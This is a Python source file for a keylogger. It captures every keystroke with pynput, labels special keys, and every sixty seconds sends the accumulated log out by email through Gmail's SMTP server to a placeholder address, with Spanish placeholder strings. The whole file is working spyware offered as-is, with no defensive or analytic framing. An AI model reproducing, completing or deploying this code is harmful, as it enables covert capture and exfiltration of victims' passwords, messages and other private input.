#!/usr/bin/env python3


import threading
import pynput.keyboard
import smtplib
from termcolor import colored
from email.message import EmailMessage


class Keylogger:

    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):

        try:
            self.log += str(key.char)

        except AttributeError:
            special_keys = {

            key.space: " ", 
            key.backspace: " Backspace ", 
            key.enter: " Enter ", 
            key.shift: " Shift ", 
            key.shift_r: " Shift_R ",
            key.ctrl: " Ctrl ", 
            key.ctrl_l: " Ctrl ",
            key.ctrl_r: " Ctrl_R ",
            key.alt: " Alt ", 
            key.alt_gr: " AltGr ",
            key.cmd: " Super ",
            key.caps_lock: " CapsLock ",
            key.tab: " Tab ",
            key.esc: " Esc ",


            key.up: " ↑ ", 
            key.down: " ↓ ", 
            key.left: " ← ", 
            key.right: " → ",
            key.insert: " Insert ",
            key.delete: " Delete ",
            key.page_up: " PageUp ",
            key.page_down: " PageDown ",
            key.home: " Home ",
            key.end: " End ",


            key.f1: " F1 ", key.f2: " F2 ", key.f3: " F3 ", key.f4: " F4 ",
            key.f5: " F5 ", key.f6: " F6 ", key.f7: " F7 ", key.f8: " F8 ",
            key.f9: " F9 ", key.f10: " F10 ", key.f11: " F11 ", key.f12: " F12 ",


            key.print_screen: " PrintScreen ",
            key.scroll_lock: " ScrollLock ",
            key.pause: " Pause ",
            key.num_lock: " NumLock "
            }
            self.log += special_keys.get(key, f" {str(key)} ")

        print(self.log)


    def send_email(self, subject, body, sender, recipients, password):

            try:
                msg = EmailMessage()
                msg["From"] = sender
                msg["To"] =  ", ".join(recipients)
                msg["Subject"] = subject
                msg.set_content(body)

                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                    server.login(sender, password)
                    server.send_message(msg)

                print(colored(f"[+] Email sent successfully!", 'green'))

            except Exception as e:
                print(colored(f"Error sending email:", 'red'), e)

    def report(self):
        
        email_body = "[+] El keylogger Se ha iniciado correctamente" if self.is_first_run else self.log
        self.send_email("Keylogger Actualizacion", email_body, "tucorreo@gmail.com(Emisor)", ["tucorreo@gmail.com (receptor, puedes ser tu mismo)"], "APP_KEY", )
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(60, self.report)
            self.timer.start()


    def start(self):

        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()


    def shutdown(self):
            self.request_shutdown = True

            if self.timer:
                self.timer.cancel()
                

